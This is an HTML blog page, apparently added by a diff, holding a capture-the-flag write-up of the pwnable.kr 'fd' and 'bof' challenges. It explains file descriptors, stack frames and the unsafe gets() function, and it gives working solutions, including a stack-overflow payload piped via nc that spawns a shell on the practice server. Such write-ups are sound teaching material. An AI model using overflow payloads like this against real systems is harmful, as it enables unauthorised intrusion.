@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<meta content="pwnable.kr - Toddler&#x27;s Bottle" property="og:title"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-04-27T12:59:37.396Z" property="og:published_time"/>
+<meta content="2020-04-27T13:02:48.347Z" property="og:modified_time"/>
+<meta content="Srikavin Ramkumar" property="og:author"/>
+<meta content="ctf-writeups" property="og:section"/>
+<meta content="pwnable.kr" property="og:tag"/>
+<meta content="binary-exploitation" property="og:tag"/>
+<meta content="buffer-overflow" property="og:tag"/>
+<meta content="pwntools" property="og:tag"/>
+<meta content="/posts/pwnable-kr-toddler-s-bottle/" property="og:url"/>
+
+    <title>pwnable.kr - Toddler&#x27;s Bottle - srikavin.me</title>
+    <link rel="stylesheet" href="/bundle.css">
+</head>
+
+<body>
+<nav>
+    <div class="nav-left">
+        <span>
+            <a href="https://srikavin.me" class="name">Srikavin Ramkumar</a>
+        </span>
+        <span>
+            <a href="/posts" class="nav-link">Posts</a>
+        </span>
+        <span>
+            <a class="nav-link" href="/tags">Tags</a>
+        </span>
+    </div>
+</nav>
+<section class="section">
+    <div class="container">
+        
+
+<div class="blog-container">
+    
+
+
+<div class="blog-header">
+    <h1 class="title">
+        
+        pwnable.kr - Toddler&#x27;s Bottle
+        
+    </h1>
+    <div class="subtitle">
+                    <span>Posted on
+                        <span class="date" title="Created: 2020-04-27T12:59:37.396Z&#10;Updated: 2020-04-27T13:02:48.347Z">April 27, 2020*
+                        </span>
+
+                        in ctf-writeups
+                        
+                </span>
+    </div>
+    <div class="tags">
+        
+        
+        <a href="&#x2F;tags&#x2F;pwnable-kr&#x2F;"><span class="tag minimal interactive">pwnable.kr</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="tag minimal interactive">binary-exploitation</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;buffer-overflow&#x2F;"><span class="tag minimal interactive">buffer-overflow</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="tag minimal interactive">pwntools</span></a>
+        
+    </div>
+</div>
+
+
+<div class="blog-content light">
+    <div class="blog-scrollspy">
+        <h1 class="scrollspy-label">Table of Contents</h1>
+        <ul>
+            
+            <li>
+                <a data-target="fd-1pt" href="#fd-1pt">fd - 1pt</a>
+                
+                <ul>
+                    
+                    <li>
+                        <a data-target="challenge" href="#challenge">Challenge</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="source-code" href="#source-code">Source Code</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="file-descriptors" href="#file-descriptors">File Descriptors</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="solution" href="#solution">Solution</a>
+                        
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+            <li>
+                <a data-target="bof-5pt" href="#bof-5pt">bof - 5pt</a>
+                
+                <ul>
+                    
+                    <li>
+                        <a data-target="challenge-1" href="#challenge-1">Challenge</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="source-code-1" href="#source-code-1">Source Code</a>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="background" href="#background">Background</a>
+                        
+                        <ul>
+                            
+                            <li>
+                                <a data-target="stack-frames" href="#stack-frames">Stack Frames</a>
+                            </li>
+                            
+                            <li>
+                                <a data-target="gets" href="#gets">gets</a>
+                            </li>
+                            
+                        </ul>
+                        
+                    </li>
+                    
+                    <li>
+                        <a data-target="solution-1" href="#solution-1">Solution</a>
+                        
+                    </li>
+                    
+                </ul>
+                
+            </li>
+            
+        </ul>
+    </div>
+
+    <h1 id="fd-1pt">fd - 1pt</h1>
+<h2 id="challenge">Challenge</h2>
+<blockquote>
+<p>Mommy! what is a file descriptor in Linux?</p>
+<p>ssh fd@pwnable.kr -p2222 (pw:guest)</p>
+</blockquote>
+<h2 id="source-code">Source Code</h2>
+<p>After ssh-ing into the server with the given details, we can view the source code of the challenge by running <code>cat fd.c</code>:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdio.h&gt;
+</span><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdlib.h&gt;
+</span><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;string.h&gt;
+</span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> buf[</span><span style="color:#0086b3;">32</span><span style="color:#323232;">];
+</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#323232;">argc, </span><span style="font-weight:bold;color:#a71d5d;">char* </span><span style="color:#323232;">argv[], </span><span style="font-weight:bold;color:#a71d5d;">char* </span><span style="color:#323232;">envp[]){
+        </span><span style="font-weight:bold;color:#a71d5d;">if</span><span style="color:#323232;">(argc</span><span style="font-weight:bold;color:#a71d5d;">&lt;</span><span style="color:#0086b3;">2</span><span style="color:#323232;">){
+                </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;pass argv[1] a number</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">);
+                </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+        }
+        </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> fd </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">atoi</span><span style="color:#323232;">( argv[</span><span style="color:#0086b3;">1</span><span style="color:#323232;">] ) </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#0086b3;">0x1234</span><span style="color:#323232;">;
+        </span><span style="font-weight:bold;color:#a71d5d;">int</span><span style="color:#323232;"> len </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+        len </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">read(fd, buf, </span><span style="color:#0086b3;">32</span><span style="color:#323232;">);
+        </span><span style="font-weight:bold;color:#a71d5d;">if</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">!</span><span style="color:#62a35c;">strcmp</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;LETMEWIN</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">, buf)){
+                </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;good job :)</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">);
+                </span><span style="color:#62a35c;">system</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;/bin/cat flag&quot;</span><span style="color:#323232;">);
+                </span><span style="color:#62a35c;">exit</span><span style="color:#323232;">(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+        }
+        </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;learn about Linux file IO</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">);
+        </span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+}
+</span></code></pre><span id="continue-reading"></span><h2 id="file-descriptors">File Descriptors</h2>
+<p>On POSIX systems, there are three standard file descriptors:</p>
+<ul>
+<li>Standard Input (stdin) which has a fd of <code>0</code></li>
+<li>Standard Output (stdout) which has a fd of <code>1</code></li>
+<li>Standard Error (stderr) which has a fd of <code>2</code></li>
+</ul>
+<h2 id="solution">Solution</h2>
+<p>The program subtracts 0x1234 from a file descriptor we provide and then reads from it. If the read string is <code>LETMEWIN\n</code>, it gives us the flag. If we get the program to read from <code>stdin</code>, we can just type <code>LETMEWIN</code> into the terminal, and we will get the flag:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#62a35c;">echo</span><span style="color:#323232;"> LETMEWIN </span><span style="font-weight:bold;color:#a71d5d;">| </span><span style="color:#323232;">./fd $(python -c </span><span style="color:#183691;">&quot;print 0x1234 + 0&quot;</span><span style="color:#323232;">)
+</span></code></pre><h1 id="bof-5pt">bof - 5pt</h1>
+<h2 id="challenge-1">Challenge</h2>
+<blockquote>
+<p>Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?</p>
+<p>Download : http://pwnable.kr/bin/bof</p>
+<p>Download : http://pwnable.kr/bin/bof.c</p>
+<p>Running at : nc pwnable.kr 9000</p>
+</blockquote>
+<h2 id="source-code-1">Source Code</h2>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdio.h&gt;
+</span><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;string.h&gt;
+</span><span style="font-weight:bold;color:#a71d5d;">#include </span><span style="color:#183691;">&lt;stdlib.h&gt;
+</span><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">func</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#323232;">key){
+	</span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> overflowme[</span><span style="color:#0086b3;">32</span><span style="color:#323232;">];
+	</span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;overflow me : &quot;</span><span style="color:#323232;">);
+	</span><span style="color:#62a35c;">gets</span><span style="color:#323232;">(overflowme);	</span><span style="font-style:italic;color:#969896;">// smash me!
+	</span><span style="font-weight:bold;color:#a71d5d;">if</span><span style="color:#323232;">(key </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#0086b3;">0xcafebabe</span><span style="color:#323232;">){
+		</span><span style="color:#62a35c;">system</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;/bin/sh&quot;</span><span style="color:#323232;">);
+	}
+	</span><span style="font-weight:bold;color:#a71d5d;">else</span><span style="color:#323232;">{
+		</span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Nah..</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">);
+	}
+}
+</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="font-weight:bold;color:#795da3;">main</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">int </span><span style="color:#323232;">argc, </span><span style="font-weight:bold;color:#a71d5d;">char* </span><span style="color:#323232;">argv[]){
+	func(</span><span style="color:#0086b3;">0xdeadbeef</span><span style="color:#323232;">);
+	</span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#0086b3;">0</span><span style="color:#323232;">;
+}
+</span></code></pre><h2 id="background">Background</h2>
+<h3 id="stack-frames">Stack Frames</h3>
+<p>The stack stores local variables and function parameters and is used to pass parameters with certain calling conventions. This diagram (taken from <a href="https://en.wikipedia.org/wiki/Call_stack">Wikipedia</a>) shows an example stack layout:</p>
+<p>svg(path=&quot;5ea6d67bcea15a083827d578.svg&quot;)</p>
+<h3 id="gets">gets</h3>
+<p>The function <code>gets</code> is insecure and allows for buffer overflows when used because it only stops at new lines or EOF. The manpage for gets (<code>man gets</code>) says this:</p>
+<blockquote>
+<p>Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the  end  of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.</p>
+</blockquote>
+<h2 id="solution-1">Solution</h2>
+<p>We need to overwrite the <code>key</code> parameter passed to <code>func</code>. To get there we will need to overwrite 36 bytes (<code>char overflowme[32]</code>, and the return address (4 bytes in 32-bit programs)). However, additional values are pushed onto the stack to save the previous location of the stack. Therefore, we have to place <code>0xcafebabe</code> at 52 bytes into the stack:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="color:#323232;">(python -c </span><span style="color:#183691;">&quot;print(&#39;A&#39;*52 + &#39;\xbe\xba\xfe\xca&#39;)&quot; </span><span style="font-weight:bold;color:#a71d5d;">&amp;&amp; </span><span style="color:#323232;">cat - ) </span><span style="font-weight:bold;color:#a71d5d;">| </span><span style="color:#323232;">nc pwnable.kr 9000
+</span></code></pre>
+<p>Note that <code>0xcafebabe</code> is encoded into a little-endian format, and <code>cat -</code> is used to allow us to communicate with the opened shell.</p>
+
+</div>
+
+
+</div>
+
+<script src="https://utteranc.es/client.js"
+        repo="srikavin/blog"
+        issue-term="url"
+        label="💬comments"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </div>
+</section>
+
+<script src="/bundle.js"></script>
+ 
+
+</body>
+
+</html>
